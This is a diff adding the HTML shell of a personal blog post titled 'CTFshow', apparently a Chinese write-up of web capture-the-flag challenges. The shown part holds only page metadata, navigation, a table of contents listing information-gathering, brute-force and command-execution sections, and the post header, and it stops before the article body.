@@ -1,0 +1,942 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)">
+<meta name="generator" content="Hexo 6.0.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.loli.net/css?family=Noto+Serif+SC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.9.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="信息收集web1flag在源代码里 web2方法一：bp抓包，POST源码  方法二：URL前加view-source：  web3bp抓包，查看响应包  web4 访问robots.txt  flag在flagishere.txt里 robots.txt是搜索引擎蜘蛛访问网站时要查看的第一个文件，并且会根据robots.txt文件的内容来爬行网站。在某种意义上说，它的一个任务就是指导蜘蛛爬行，减">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTFshow">
+<meta property="og:url" content="http://example.com/2022/03/08/CTFshow/index.html">
+<meta property="og:site_name" content="Echo">
+<meta property="og:description" content="信息收集web1flag在源代码里 web2方法一：bp抓包，POST源码  方法二：URL前加view-source：  web3bp抓包，查看响应包  web4 访问robots.txt  flag在flagishere.txt里 robots.txt是搜索引擎蜘蛛访问网站时要查看的第一个文件，并且会根据robots.txt文件的内容来爬行网站。在某种意义上说，它的一个任务就是指导蜘蛛爬行，减">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220115164912202.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220115165115804.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220115170052755.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220115204306731.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220115204339638.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220115204605393.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220115204702358.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220115205037263.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220115210116656.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220115210543987.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220115210710041.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220115210734790.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220115221144978.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220115221125272.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220115221452471.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220115221625932.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220115222114188.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220115222503948.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220115222551664.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220115224231678.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220115224616061.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220115224847800.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220115224902121.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220116134407774.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220116134911085.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220116135003467.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220116135617684.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220116135532861.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220116135844808.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220116141900525.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220116142105448.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220116142117466.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220116142252074.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220116142348164.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220116142752905.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220116143037122.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220116143629362.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220116143552228.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220116143754042.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220116144035834.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220116144246693.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220116144409085.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220116144448192.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220116144736889.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220116144839363.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220116144920937.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220116145025640.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220116145520659.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220116150323740.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220116150618762.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220116150644760.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220116150722008.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220116150834750.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220116151831468.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220116153458454.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220116153607572.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220116153831221.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220116154606705.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220116154622944.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220116154949245.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220116155025878.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220116155402143.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220116155602966.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220116155944387.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220116160044874.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220116160830902.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220116162609743.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220116202537401.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220116203852617.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220116171821919.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220116204048032.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220116203131650.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220116204646221.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220116204721558.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220118111615441.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220118114241220.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220118114324854.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220118124922303.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220118123418810.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220119113632889.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220119112943153.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220119140956990.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220119141021376.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220119141051254.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220119145040246.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220119145020124.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220119155222121.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220119165355955.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220119165335174.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220119192222187.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220119191300328.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220119192015391.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220119192042083.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220119194102280.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220119194645996.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220119194716613.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220120222355359.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220120221550505.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220120215012942.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220120215219382.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220120221628641.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220120222045923.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220121150757284.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220121150936152.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220121151034044.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220121151258500.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220121152107557.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220121155601615.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220121160527232.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220121160609695.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220121163156964.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220121163736641.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220121163916210.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220121165055553.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220121223323191.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220121223757658.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220121225223264.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220123195829460.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220123200137401.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220123215344010.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220123220748630.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220123223117291.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220123224059837.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220123224414358.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220123225716037.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220124121243869.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220124131602848.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220124131948470.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220124132915367.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220124140605804.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220124144510476.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220124141445757.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220124141844065.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220124230027276.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220127211944518.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220127212157187.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220127212204564.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220127221626111.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220127223234161.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220127223555173.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220127223755217.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220127224459611.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220127225946719.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220127230657232.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220128211059961.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220128215058673.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220128220043797.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220128220619948.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220128221324732.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220128221645044.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220128221925099.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220128222111942.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220129115224616.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220129115722029.png">
+<meta property="og:image" content="http://example.com/2022/03/08/CTFshow/image-20220129120340261.png">
+<meta property="article:published_time" content="2022-03-08T09:02:01.000Z">
+<meta property="article:modified_time" content="2022-04-02T15:04:05.833Z">
+<meta property="article:author" content="CJ">
+<meta property="article:tag" content="STUDY">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/03/08/CTFshow/image-20220115164912202.png">
+
+
+<link rel="canonical" href="http://example.com/2022/03/08/CTFshow/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2022/03/08/CTFshow/","path":"2022/03/08/CTFshow/","title":"CTFshow"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>CTFshow | Echo</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Echo</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">CJ'S BLOG</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#web1"><span class="nav-number">1.1.</span> <span class="nav-text">web1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web2"><span class="nav-number">1.2.</span> <span class="nav-text">web2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web3"><span class="nav-number">1.3.</span> <span class="nav-text">web3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web4"><span class="nav-number">1.4.</span> <span class="nav-text">web4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web5"><span class="nav-number">1.5.</span> <span class="nav-text">web5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web6"><span class="nav-number">1.6.</span> <span class="nav-text">web6</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web7"><span class="nav-number">1.7.</span> <span class="nav-text">web7</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web8"><span class="nav-number">1.8.</span> <span class="nav-text">web8</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web9"><span class="nav-number">1.9.</span> <span class="nav-text">web9</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web10"><span class="nav-number">1.10.</span> <span class="nav-text">web10</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web11"><span class="nav-number">1.11.</span> <span class="nav-text">web11</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web12"><span class="nav-number">1.12.</span> <span class="nav-text">web12</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web13"><span class="nav-number">1.13.</span> <span class="nav-text">web13</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web14"><span class="nav-number">1.14.</span> <span class="nav-text">web14</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web15"><span class="nav-number">1.15.</span> <span class="nav-text">web15</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web16"><span class="nav-number">1.16.</span> <span class="nav-text">web16</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web17"><span class="nav-number">1.17.</span> <span class="nav-text">web17</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web18"><span class="nav-number">1.18.</span> <span class="nav-text">web18</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web19"><span class="nav-number">1.19.</span> <span class="nav-text">web19</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web20"><span class="nav-number">1.20.</span> <span class="nav-text">web20</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%88%86%E7%A0%B4"><span class="nav-number">2.</span> <span class="nav-text">爆破</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#web21"><span class="nav-number">2.1.</span> <span class="nav-text">web21</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web22"><span class="nav-number">2.2.</span> <span class="nav-text">web22</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web23"><span class="nav-number">2.3.</span> <span class="nav-text">web23</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web24"><span class="nav-number">2.4.</span> <span class="nav-text">web24</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web25"><span class="nav-number">2.5.</span> <span class="nav-text">web25</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web26"><span class="nav-number">2.6.</span> <span class="nav-text">web26</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web27"><span class="nav-number">2.7.</span> <span class="nav-text">web27</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web28"><span class="nav-number">2.8.</span> <span class="nav-text">web28</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">3.</span> <span class="nav-text">命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#web29"><span class="nav-number">3.1.</span> <span class="nav-text">web29</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web30"><span class="nav-number">3.2.</span> <span class="nav-text">web30</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web31"><span class="nav-number">3.3.</span> <span class="nav-text">web31</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web32"><span class="nav-number">3.4.</span> <span class="nav-text">web32</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web33"><span class="nav-number">3.5.</span> <span class="nav-text">web33</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web34"><span class="nav-number">3.6.</span> <span class="nav-text">web34</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web35"><span class="nav-number">3.7.</span> <span class="nav-text">web35</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web36"><span class="nav-number">3.8.</span> <span class="nav-text">web36</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web37"><span class="nav-number">3.9.</span> <span class="nav-text">web37</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web38"><span class="nav-number">3.10.</span> <span class="nav-text">web38</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web39"><span class="nav-number">3.11.</span> <span class="nav-text">web39</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web40"><span class="nav-number">3.12.</span> <span class="nav-text">web40</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web41"><span class="nav-number">3.13.</span> <span class="nav-text">web41</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web42"><span class="nav-number">3.14.</span> <span class="nav-text">web42</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web43"><span class="nav-number">3.15.</span> <span class="nav-text">web43</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web44"><span class="nav-number">3.16.</span> <span class="nav-text">web44</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web45"><span class="nav-number">3.17.</span> <span class="nav-text">web45</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web46"><span class="nav-number">3.18.</span> <span class="nav-text">web46</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web47"><span class="nav-number">3.19.</span> <span class="nav-text">web47</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web48"><span class="nav-number">3.20.</span> <span class="nav-text">web48</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web49"><span class="nav-number">3.21.</span> <span class="nav-text">web49</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web50"><span class="nav-number">3.22.</span> <span class="nav-text">web50</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web51"><span class="nav-number">3.23.</span> <span class="nav-text">web51</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web52"><span class="nav-number">3.24.</span> <span class="nav-text">web52</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web53"><span class="nav-number">3.25.</span> <span class="nav-text">web53</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web54"><span class="nav-number">3.26.</span> <span class="nav-text">web54</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">CJ</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">23</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/cjtyx" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;cjtyx" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:2081297822@qq.com" title="E-Mail → mailto:2081297822@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/08/CTFshow/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="CJ">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Echo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CTFshow
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2022-03-08 17:02:01" itemprop="dateCreated datePublished" datetime="2022-03-08T17:02:01+08:00">2022-03-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-04-02 23:04:05" itemprop="dateModified" datetime="2022-04-02T23:04:05+08:00">2022-04-02</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
